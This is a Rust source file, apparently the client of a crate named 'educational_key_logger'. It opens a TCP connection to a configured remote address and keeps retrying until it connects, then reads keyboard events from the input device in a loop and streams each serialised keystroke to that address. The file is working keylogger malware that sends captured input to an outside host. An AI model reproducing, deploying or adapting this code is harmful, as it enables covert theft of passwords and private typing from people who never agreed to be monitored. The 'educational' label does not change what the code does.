mod keylogger;
use educational_key_logger::IP_PORT;
use keylogger::{get_device_file, get_key_event};
use log::warn;
use std::{io::Write, net::TcpStream, thread, time::Duration};

fn main() {
    // #[cfg(debug_assertions)]
    {
        if std::env::var_os("RUST_LOG").is_none() {
            unsafe {
                std::env::set_var("RUST_LOG", "info");
            }
        }
        env_logger::init();
    }
    const RETRY_SEC: u64 = 3;
    let mut stream = loop {
        match TcpStream::connect(IP_PORT) {
            Ok(stream) => break stream,
            Err(err) => {
                warn!(
                    "Failed to connect to {}: {}. Trying again in {} seconds",
                    IP_PORT, err, RETRY_SEC
                );
                thread::sleep(Duration::from_secs(RETRY_SEC));
            }
        }
    };
    let device = get_device_file();
    loop {
        thread::sleep(Duration::from_millis(10));
        let key_event = get_key_event(&device);
        if !key_event.is_key_event() {
            continue;
        };
        let encoded = postcard::to_allocvec(&key_event)
            .expect("Encoding InputEvent from client side should not fail.");
        let size = encoded.len();
        debug_assert!(
            size <= u8::MAX.into(),
            "Encoded InputEvent should never be larger than 255 bytes."
        );
        if let Err(err) = stream.write_all(&(size as u8).to_be_bytes()) {
            println!("Failed: {}", err)
        }
        if let Err(err) = stream.write_all(&encoded) {
            println!("Failed: {}", err)
        };
    }
}
